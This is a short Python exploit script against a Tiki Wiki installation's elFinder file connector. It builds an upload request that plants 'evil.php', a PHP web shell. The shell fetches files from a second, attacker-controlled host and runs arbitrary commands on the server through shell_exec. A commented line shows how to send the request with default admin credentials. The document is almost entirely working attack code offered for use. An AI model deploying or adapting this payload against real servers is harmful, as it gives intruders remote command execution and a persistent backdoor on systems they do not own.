#!/usr/bin/python 
# недействительный 31337 Team
# p4yl04d = https://bethebeast.pl/?p=953    [[::ch4n6e 1p::]]

import requests
import json
from requests.auth import HTTPBasicAuth

url = 'http://192.168.1.152:8080/tiki/vendor_extra/elfinder/php/connector.minimal.php'

headers = {
    'Host': '192.168.1.152:8080',
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
    'Content-Type': 'multipart/form-data; boundary=_Part_1337'
}

payload = (
    '--_Part_1337\n'
    'Content-Disposition: form-data; name="cmd"\n\n'
    'upload\n'
    '--_Part_1337\n'
    'Content-Disposition: form-data; name="target"\n\n'
    'l1_Lw\n'
    '--_Part_1337\n'
    'Content-Disposition: form-data; name="upload[]"; filename="evil.php"\n'
    'Content-Type: application/octet-stream)\n\n'
    '/*<?php /**/ error_reporting(0); if (isset($_REQUEST["fupload"])) { file_put_contents($_REQUEST["fupload"], file_get_contents("http://192.168.1.10/" . $_REQUEST["fupload"]));};if (isset($_REQUEST["fexec"])) { echo "<pre>" . shell_exec($_REQUEST["fexec"]) . "</pre>";};\n'
    '--_Part_1337--\n'
    )

# If your target uses authentication then use: 
# upload = requests.post(url, headers=headers, data=payload, auth=('admin', 'admin'))
